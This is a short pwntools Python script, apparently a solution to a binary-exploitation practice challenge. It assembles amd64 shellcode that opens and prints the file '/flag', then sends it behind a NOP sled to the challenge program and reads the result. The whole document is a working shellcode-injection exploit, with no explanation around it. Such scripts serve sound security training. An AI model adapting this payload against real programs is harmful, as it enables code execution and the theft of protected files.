from pwn import *

shellcode = asm("""
    mov     rdi, 0x67616c662f
    push    rdi
    push    rsp
    pop     rdi

    push    O_RDONLY
    pop     rsi

    xor     rdx, rdx

    push    SYS_open
    pop     rax
    syscall

    xor     rdi, rdi
    inc     rdi

    xchg    rax, rsi
    xor     rdx, rdx
    push    0x100
    pop     r10

    push    SYS_sendfile
    pop     rax
    syscall

    push    SYS_exit
    pop     rax
    syscall

""", arch='amd64', os='linux')


io = process(['/challenge/binary-exploitation-nopsled-shellcode'])


io.send(b'\x90'*(0x1000 - len(shellcode)) + shellcode)
io.recvline_contains(b'Executing shellcode')

print(io.readall().decode())


